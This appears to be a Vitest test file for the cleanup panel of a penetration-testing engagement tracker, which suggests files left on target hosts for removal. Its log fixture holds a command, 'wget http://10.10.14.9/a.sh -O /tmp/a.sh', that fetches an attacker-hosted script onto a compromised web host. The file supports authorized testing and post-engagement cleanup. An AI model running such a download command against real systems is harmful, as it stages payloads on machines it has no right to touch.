import { QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router";
import { beforeEach, describe, expect, it, vi } from "vitest";
import App from "../App";
import { useCaptureStore } from "../features/capture/useCaptureStore";
import { useCredPickStore } from "../features/checklist/credPick";
import { api } from "../lib/api";
import { makeQueryClient } from "../lib/queryClient";
import type { CleanupInput, CleanupItem } from "../types/cleanup";
import type { Engagement } from "../types/engagement";
import type { Host } from "../types/host";
import type { LogEntry } from "../types/log";
import { RavenError } from "../types/errors";

vi.mock("../lib/api");
const m = vi.mocked(api, true);

const E1: Engagement = {
  id: "e1", name: "Lab A", kind: "lab", client: null, subLabel: null, scopeCidrs: ["10.10.10.0/24"],
  domain: null, startsAt: null, endsAt: null, timeboxStart: null, timeboxMinutes: null, status: "active",
  createdAt: 1, updatedAt: 1, lastActivityAt: null, lastRanOn: null, msfHostId: null, timeboxPausedMs: 0, timeboxPausedAt: null,
};
const H1: Host = {
  id: "h1", engagementId: "e1", name: "web01", ip: "10.10.10.50", os: "linux", boardColumn: "information-gathering", boardManual: false,
  dualHomed: false, boardDerived: null, accessReviewedAt: null, adSet: null, adSetEffective: false, access: "none", createdAt: 1, updatedAt: 1,
};
const upload: LogEntry = {
  id: "l1", engagementId: "e1", kind: "command", title: "fetch", titleEdited: false, ranOn: null, hostIds: ["h1"],
  observations: null, returnedNothing: false, private: false,
  content: { kind: "command", blocks: [{ command: "wget http://10.10.14.9/a.sh -O /tmp/a.sh", output: "", shell: "www-data@web01:/tmp$" }] },
  at: 1000, createdAt: 1000, updatedAt: 1000,
};

let store: CleanupItem[];
const item = (id: string, over: Partial<CleanupItem> = {}): CleanupItem => ({
  id, engagementId: "e1", hostId: "h1", kind: "file", target: "/tmp/x", notes: null, sourceEntryId: null, suggestionKey: null,
  status: "open", removedAt: null, createdAt: 1, updatedAt: 1, ...over,
});

function mount(opts: { log?: LogEntry[]; path?: string } = {}) {
  m.engagementGet.mockResolvedValue(E1);
  m.hostsList.mockResolvedValue([H1]);
  m.logList.mockResolvedValue(opts.log ?? []);
  return render(
    <QueryClientProvider client={makeQueryClient()}>
      <MemoryRouter initialEntries={[opts.path ?? "/e/e1/s/checklist"]}>
        <App />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

beforeEach(() => {
  localStorage.clear();
  vi.resetAllMocks();
  useCaptureStore.getState().reset();
  useCredPickStore.getState().reset();
  store = [];
  m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
  m.settingsGet.mockResolvedValue({ autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "", listenerPort: "", kaliUser: "kali", windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false, reportName: "", reportEmail: "", reportOsid: "", reportMethodology: "", reportIntroduction: "", reportGuidesHidden: [] });
  m.engagementsList.mockResolvedValue([E1]);
  m.engagementsProgress.mockResolvedValue({});
  m.servicesList.mockResolvedValue([]);
  m.servicesListEngagement.mockResolvedValue([]);
  m.checklistList.mockResolvedValue([]);
  m.credentialsList.mockResolvedValue([]);
  m.credAttemptsList.mockResolvedValue([]);
  m.hopsList.mockResolvedValue([]);
  m.tunnelsList.mockResolvedValue([]);
  m.notesList.mockResolvedValue([]);
  // A small in-memory stand-in for the Rust store.
  m.cleanupList.mockImplementation(async () => store.map((i) => ({ ...i })));
  m.cleanupCounts.mockImplementation(async () => {
    const n = store.filter((i) => i.status === "open").length;
    return (n > 0 ? { e1: n } : {}) as Record<string, number>;
  });
  m.cleanupCreate.mockImplementation(async (_e: string, input: CleanupInput) => {
    if (input.target.trim() === "") throw new RavenError("validation", "Say what was left behind");
    const it = item(`c${store.length + 1}`, { ...input, hostId: input.hostId ?? null, notes: input.notes ?? null, sourceEntryId: input.sourceEntryId ?? null, suggestionKey: input.suggestionKey ?? null });
    store.push(it);
    return it;
  });
  m.cleanupDismiss.mockImplementation(async (_e: string, key: string) => {
    store.push(item(`d${store.length + 1}`, { suggestionKey: key, status: "dismissed" }));
    return null;
  });
  m.cleanupSetRemoved.mockImplementation(async (id: string, removed: boolean) => {
    const it = store.find((i) => i.id === id)!;
    it.status = removed ? "removed" : "open";
    it.removedAt = removed ? Date.now() : null;
    return { ...it };
  });
  m.cleanupDelete.mockImplementation(async (id: string) => {
    store = store.filter((i) => i.id !== id);
    return null;
  });
});

const panel = async () => within(await screen.findByRole("region", { name: "Cleanup" }));

describe("cleanup panel", () => {
  it("suggestions from the log show and Add creates the item", async () => {
    const user = userEvent.setup();
    mount({ log: [upload] });
    const p = await panel();
    expect(await p.findByText("Suggested")).toBeInTheDocument();
    expect(p.getAllByText("/tmp/a.sh").length).toBeGreaterThan(0);
    expect(p.getByText("web01")).toBeInTheDocument();
    expect(p.getByTitle("wget http://10.10.14.9/a.sh -O /tmp/a.sh")).toBeInTheDocument();
    await user.click(p.getByRole("button", { name: "Add /tmp/a.sh" }));
    await waitFor(() => expect(p.getByText("On target")).toBeInTheDocument());
    expect(m.cleanupCreate).toHaveBeenCalledWith("e1", expect.objectContaining({
      suggestionKey: expect.any(String), sourceEntryId: "l1", hostId: "h1", kind: "file", target: "/tmp/a.sh",
    }));
    expect(p.queryByText("Suggested")).not.toBeInTheDocument();
  });

  it("dismissing hides the suggestion for good", async () => {
    const user = userEvent.setup();
    mount({ log: [upload] });
    const p = await panel();
    await user.click(await p.findByRole("button", { name: "Dismiss /tmp/a.sh" }));
    await waitFor(() => expect(p.queryByText("Suggested")).not.toBeInTheDocument());
    expect(m.cleanupDismiss).toHaveBeenCalledWith("e1", expect.any(String));
    expect(p.queryByText("On target")).not.toBeInTheDocument();
    expect(p.getByText(/Nothing left on targets yet/)).toBeInTheDocument();
  });

  it("marking removed moves the item to Removed and back", async () => {
    const user = userEvent.setup();
    store = [item("c1", { target: "/tmp/x" })];
    mount();
    const p = await panel();
    expect(await p.findByText("On target")).toBeInTheDocument();
    await user.click(p.getByRole("button", { name: "Mark /tmp/x removed" }));
    expect(await p.findByRole("heading", { name: "Removed" })).toBeInTheDocument();
    expect(p.getByText(/^Removed \w{3} \d+/)).toBeInTheDocument();
    expect(p.queryByText("On target")).not.toBeInTheDocument();
    await user.click(p.getByRole("button", { name: "Restore /tmp/x" }));
    expect(await p.findByText("On target")).toBeInTheDocument();
    expect(m.cleanupSetRemoved).toHaveBeenNthCalledWith(1, "c1", true);
    expect(m.cleanupSetRemoved).toHaveBeenNthCalledWith(2, "c1", false);
  });

  it("double-clicking Add creates one item and shows no error", async () => {
    const user = userEvent.setup();
    mount({ log: [upload] });
    const p = await panel();
    const add = await p.findByRole("button", { name: "Add /tmp/a.sh" });
    await user.dblClick(add);
    await waitFor(() => expect(p.getByText("On target")).toBeInTheDocument());
    expect(m.cleanupCreate).toHaveBeenCalledTimes(1);
    expect(p.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("double-clicking Dismiss dismisses once and shows no error", async () => {
    const user = userEvent.setup();
    mount({ log: [upload] });
    const p = await panel();
    await user.dblClick(await p.findByRole("button", { name: "Dismiss /tmp/a.sh" }));
    await waitFor(() => expect(p.queryByText("Suggested")).not.toBeInTheDocument());
    expect(m.cleanupDismiss).toHaveBeenCalledTimes(1);
    expect(p.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("a failed Add brings the suggestion back with the error, and a later success clears it", async () => {
    const user = userEvent.setup();
    mount({ log: [upload] });
    const p = await panel();
    m.cleanupCreate.mockRejectedValueOnce(new RavenError("validation", "nope"));
    await user.click(await p.findByRole("button", { name: "Add /tmp/a.sh" }));
    expect(await p.findByRole("alert")).toHaveTextContent("nope");
    await user.click(await p.findByRole("button", { name: "Add /tmp/a.sh" }));
    await waitFor(() => expect(p.getByText("On target")).toBeInTheDocument());
    expect(p.queryByRole("alert")).not.toBeInTheDocument();
  });

  it("add by hand validates the target", async () => {
    const user = userEvent.setup();
    mount();
    const p = await panel();
    await user.click(await p.findByRole("button", { name: "Add item" }));
    const dlg = within(await screen.findByRole("dialog"));
    await user.click(dlg.getByRole("button", { name: "Add item" }));
    expect(await dlg.findByRole("alert")).toHaveTextContent("Say what was left behind");
    expect(screen.getByRole("dialog")).toBeInTheDocument();
    await user.type(dlg.getByLabelText("Target"), "backdoor");
    await user.click(dlg.getByRole("button", { name: "Add item" }));
    await waitFor(() => expect(screen.queryByRole("dialog")).not.toBeInTheDocument());
    expect(m.cleanupCreate).toHaveBeenLastCalledWith("e1", expect.objectContaining({ kind: "file", target: "backdoor", hostId: null }));
    expect(await p.findByText("backdoor")).toBeInTheDocument();
  });

  it("deleting asks first", async () => {
    const user = userEvent.setup();
    store = [item("c1")];
    mount();
    const p = await panel();
    await user.click(await p.findByRole("button", { name: "Delete /tmp/x" }));
    expect(m.cleanupDelete).not.toHaveBeenCalled();
    await user.click(within(await screen.findByRole("dialog")).getByRole("button", { name: "Delete item" }));
    await waitFor(() => expect(m.cleanupDelete).toHaveBeenCalledWith("c1"));
    await waitFor(() => expect(p.queryByText("On target")).not.toBeInTheDocument());
  });

  it("the strip and card show the open count", async () => {
    store = [item("c1"), item("c2", { target: "/tmp/y" }), item("c3", { target: "/tmp/z", status: "removed", removedAt: 5 })];
    const strip = mount({ path: "/e/e1" });
    expect(await within(await screen.findByRole("status", { name: "Engagement status" })).findByLabelText("Cleanup 2")).toBeInTheDocument();
    strip.unmount();
    mount({ path: "/" });
    expect((await screen.findByText("Cleanup")).nextSibling).toHaveTextContent("2");
  });

  it("the Engagement checklist shows the Cleanup panel and the sidebar is unchanged", async () => {
    mount();
    await panel();
    const nav = screen.getByRole("navigation", { name: "Engagement" });
    const links = within(nav).getAllByRole("link").filter((l) => /^(Board|Log|Credentials|Findings|Network|Engagement checklist|Report)/.test(l.textContent ?? ""));
    expect(links).toHaveLength(7);
    expect(within(nav).queryByRole("link", { name: /Cleanup/ })).not.toBeInTheDocument();
    expect(links[6]).toHaveTextContent("Report");
    expect(links[6]).toHaveTextContent("7");
  });
});
